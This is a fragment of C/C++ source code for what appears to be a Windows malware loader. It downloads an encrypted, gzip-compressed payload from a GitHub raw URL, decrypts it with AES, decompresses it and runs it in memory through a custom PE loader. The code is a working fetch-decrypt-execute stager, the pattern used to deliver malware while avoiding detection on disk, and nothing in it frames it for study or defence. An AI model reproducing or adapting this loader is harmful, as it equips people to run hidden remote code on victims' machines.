...
static const WCHAR* downloadPath = L"https://raw.githubusercontent.com/soundcloudenjoyer/aes_crypt_decrypt_zip_gzip/master/asjdasdgahdg.bin.gz"; // PRIVATE TO CHANGE
...
int main() {
    ...
    if (download(&downloadedPayload, &downloadedPayloadSize)) {
        ...
        if(stuff::decryptPayload(AESEncryptionKey, downloadedPayload + KEY_SIZE, downloadedPayloadSize - KEY_SIZE, compressedPayload, &compressedSize)) {
            VirtualFree(downloadedPayload, 0, MEM_RELEASE); downloadedPayloadSize = 0; 
            size_t decryptedSize = 0; memcpy(&decryptedSize, compressedPayload + compressedSize - 4, 4);
            BYTE* decryptedPayload = (BYTE*)malloc(decryptedSize);
            if(stuff::GZIPdecompress(compressedPayload, compressedSize, decryptedPayload, &decryptedSize)) {
                free(compressedPayload); compressedSize = 0;
                printf("%d bytes were decrypted!\n", decryptedSize);

                if(stuff::LoadPEMain(decryptedPayload, decryptedSize)) {
                    printf("LoadPE succeeded!\n");
                    free(decryptedPayload);
                    return 0;
                } else {printf("LoadPE failed!\n"); free(decryptedPayload); return 0;}
            } else {printf("Decompress failed!\n"); free(compressedPayload); free(decryptedPayload); return 1;}
